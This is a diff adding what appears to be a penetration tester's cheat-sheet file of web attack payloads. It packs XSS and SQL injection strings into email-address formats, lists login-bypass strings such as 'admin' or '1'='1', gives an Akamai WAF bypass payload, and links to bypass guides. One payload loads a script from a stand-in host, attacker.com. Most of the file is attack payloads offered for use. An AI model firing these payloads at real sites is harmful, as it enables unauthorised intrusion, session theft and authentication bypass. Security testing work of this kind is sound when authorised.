@@ -1,0 +1,68 @@
+# https://brutelogic.com.br/blog/xss-limited-input-formats/
+# https://book.hacktricks.xyz/pentesting-web/email-injections
+# https://hacktricks.boitatech.com.br/emails-vulns
+
+/^[a-z0-9.-_+]@[a-z0-9.-]$/i
+
+Useful Payloads in Email and Phone Number:
+
+The structure of valid addresses:
+"payload"@mail.local
+name@"payload"mail.local
+name(payload)@mail.local
+name@(payload)mail.local
+name@mail.local(payload)
+
+❗️Based on this format, we can generate different payloads for different types of vulnerabilities and try to exploit them.
+
+"'-sleep(5)-'"@mail.local.
+"'-alert(5)-'"@mail.local.
+"'--><script/src=//attacker.com></script>"@mail.local
+"<img/src/onerror=alert(5)>"@mail.local
+name(<script>alert(5)</script>)@mail.local
+name@mail(<script>alert(5)</script>).local
+"'OR 1=1 --'"@mail.local
+
+"><svg/onload=confirm(1)>"@x.y
+
+# CSP and Bypasses
+https://www.cobalt.io/blog/csp-and-bypasses
+
+# SQLi CheatSheet:
+https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
+
+SQLi Bypass:
+https://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html
+admin' or '1'='1
+’’ or 1=1’
+ ' or 1--
+
+# Bypass XSS in WAF:
+https://www.volkis.com.au/blog/bypass-xss-in-wafs/
+
+# Reflected XSS Bypass Payloads with HTML
+https://www.secrash.com/2023/07/reflected-xss-bypass-payloads-with-html.html
+
+# Web Login Bypass
+https://exploit-notes.hdks.org/exploit/web/method/web-login-bypass/
+
+# WAF-bypass-xss-payloads
+https://github.com/gprime31/WAF-bypass-xss-payloads/tree/master
+
+# Akamai WAF BYpass
+<style>@keyframes a{}b{animation:a;}</style>
+<b/onanimationstart=prompt`${document.domain}&#x60;>
+
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass
+
+# WAF Bypass CheatSheets
+https://github.com/0xVIC/CheatSheets/tree/master
+
+https://hacklido.com/blog/504-5-ways-i-bypassed-your-web-application-firewall-waf/2
+https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
+https://pentestbook.six2dez.com/enumeration/webservices/wafs
+https://gowsundar.gitbook.io/book-of-bugbounty-tips/cross-site-scripting-xss
+https://www.pwny.cc/web-attacks/cross-site-scripting-xss/waf-bypasses
+
+403 & 401 Bypasses
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses
